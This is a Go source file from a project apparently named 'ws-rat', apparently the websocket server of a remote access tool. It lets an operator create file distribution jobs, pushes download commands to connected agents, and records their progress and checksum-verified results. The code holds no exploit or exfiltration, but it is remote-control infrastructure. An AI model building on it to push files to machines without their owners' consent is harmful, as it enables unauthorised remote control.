package wsserver

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"time"
	"ws-rat/internal/distribution"
)

func (s *Server) Online(id string) bool { _, ok := s.registry.Get(id); return ok }
func (s *Server) Send(id string, v any) error {
	c, ok := s.registry.Get(id)
	if !ok {
		s.logger.Printf("distribution websocket send rejected agent=%s reason=agent_offline", id)
		return fmt.Errorf("agent offline")
	}
	if cmd, ok := v.(distribution.DownloadCommand); ok {
		s.logger.Printf("distribution websocket send start agent=%s type=%s job=%s file=%s filename=%q size=%d expires_at=%s",
			id, cmd.Type, cmd.JobID, cmd.FileID, cmd.Filename, cmd.Size, cmd.ExpiresAt.Format(time.RFC3339))
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	err := c.WriteJSON(ctx, v)
	if err != nil {
		s.logger.Printf("distribution websocket send failed agent=%s err=%q", id, err)
	} else {
		s.logger.Printf("distribution websocket send complete agent=%s", id)
	}
	return err
}
func hashToken(v string) string { x := sha256.Sum256([]byte(v)); return hex.EncodeToString(x[:]) }
func prefix(v string, n int) string {
	if len(v) <= n {
		return v
	}
	return v[:n]
}
func (s *Server) handleDistributionFrontend(f *FrontendClient, user string, raw json.RawMessage) error {
	s.logger.Printf("distribution frontend request user=%q payload_bytes=%d", user, len(raw))
	var req distribution.CreateRequest
	if err := json.Unmarshal(raw, &req); err != nil {
		s.logger.Printf("distribution frontend request rejected reason=invalid_json err=%q", err)
		return fmt.Errorf("invalid request")
	}
	ctx, cancel := context.WithTimeout(context.Background(), databaseTimeout)
	defer cancel()
	j, err := s.distributions.Create(ctx, user, req)
	if err != nil {
		s.logger.Printf("distribution frontend request failed user=%q file_id=%q err=%q", user, req.FileID, err)
		return err
	}
	s.logger.Printf("distribution frontend request complete job=%s file=%s status=%s total=%d online=%d offline=%d",
		j.ID, j.FileID, j.Status, j.Total, j.Online, j.Offline)
	return f.WriteJSON(map[string]any{"type": "FILE_DISTRIBUTION_CREATED", "job_id": j.ID, "file_id": j.FileID, "total_targets": j.Total, "online_targets": j.Online, "offline_targets": j.Offline, "status": j.Status})
}
func (s *Server) handleAgentDistribution(client *Client, raw json.RawMessage, kind string) bool {
	ctx, cancel := context.WithTimeout(context.Background(), databaseTimeout)
	defer cancel()
	if kind == "FILE_DOWNLOAD_PROGRESS" {
		var p distribution.Progress
		if err := json.Unmarshal(raw, &p); err != nil {
			s.logger.Printf("distribution progress rejected agent=%s reason=invalid_json err=%q", client.Info.ID, err)
			return true
		}
		s.logger.Printf("distribution progress received agent=%s job=%s progress=%d downloaded_bytes=%d total_bytes=%d", client.Info.ID, p.JobID, p.Progress, p.DownloadedBytes, p.TotalBytes)
		if p.AgentID != client.Info.ID || p.Progress < 0 || p.Progress > 100 || p.DownloadedBytes < 0 || p.TotalBytes < 0 {
			s.logger.Printf("distribution progress rejected agent=%s job=%s reason=payload_validation payload_agent=%s", client.Info.ID, p.JobID, p.AgentID)
			return true
		}
		changed, err := s.distributionRepo.UpdateProgress(ctx, p.JobID, client.Info.ID, "DOWNLOADING", p.Progress, p.DownloadedBytes)
		if err != nil {
			s.logger.Printf("distribution progress persist_failed agent=%s job=%s err=%q", client.Info.ID, p.JobID, err)
		} else {
			s.logger.Printf("distribution progress persisted agent=%s job=%s changed=%t", client.Info.ID, p.JobID, changed)
			s.subscriptions.PublishDistribution(distribution.Update{Type: "FILE_DISTRIBUTION_TARGET_UPDATE", JobID: p.JobID, AgentID: client.Info.ID, Hostname: client.Info.Hostname, Status: "DOWNLOADING", Progress: p.Progress, DownloadedBytes: p.DownloadedBytes, TotalBytes: p.TotalBytes})
		}
		return true
	}
	if kind == "FILE_DOWNLOAD_RESULT" {
		var r distribution.Result
		if err := json.Unmarshal(raw, &r); err != nil {
			s.logger.Printf("invalid FILE_DOWNLOAD_RESULT from agent %s: decode JSON: %v raw=%s", client.Info.ID, err, raw)
			return true
		}
		if r.AgentID != client.Info.ID {
			s.logger.Printf("rejected FILE_DOWNLOAD_RESULT: connected agent=%s payload agent_id=%s job=%s", client.Info.ID, r.AgentID, r.JobID)
			return true
		}
		s.logger.Printf("distribution result received agent=%s job=%s file=%s status=%s bytes=%d code=%q message=%q sha256_prefix=%s",
			client.Info.ID, r.JobID, r.FileID, r.Status, r.BytesDownloaded, r.ErrorCode, r.ErrorMessage, prefix(r.SHA256, 12))
		if r.Status != "COMPLETED" && r.Status != "FAILED" {
			s.logger.Printf("rejected FILE_DOWNLOAD_RESULT from agent %s: status=%q; expected COMPLETED or FAILED", client.Info.ID, r.Status)
			return true
		}
		persistedStatus, err := s.distributionRepo.Finish(ctx, r.JobID, client.Info.ID, r.FileID, r.Status, r.SHA256, r.ErrorCode, r.ErrorMessage, r.BytesDownloaded)
		if err != nil {
			s.logger.Printf("cannot finish file distribution for agent %s job=%s file=%s: %v", client.Info.ID, r.JobID, r.FileID, err)
			return true
		}
		s.logger.Printf("distribution result persisted agent=%s job=%s file=%s status=%s", client.Info.ID, r.JobID, r.FileID, persistedStatus)
		if persistedStatus != r.Status {
			s.logger.Printf("file distribution result changed from %s to %s for agent %s job=%s (reported checksum did not match)", r.Status, persistedStatus, client.Info.ID, r.JobID)
		}
		s.logger.Printf("file distribution target finished: agent=%s job=%s file=%s status=%s", client.Info.ID, r.JobID, r.FileID, persistedStatus)
		s.subscriptions.PublishDistribution(distribution.Update{Type: "FILE_DISTRIBUTION_TARGET_UPDATE", JobID: r.JobID, AgentID: client.Info.ID, Hostname: client.Info.Hostname, Status: persistedStatus, Progress: map[bool]int{true: 100}[persistedStatus == "COMPLETED"], DownloadedBytes: r.BytesDownloaded})
		return true
	}
	return false
}
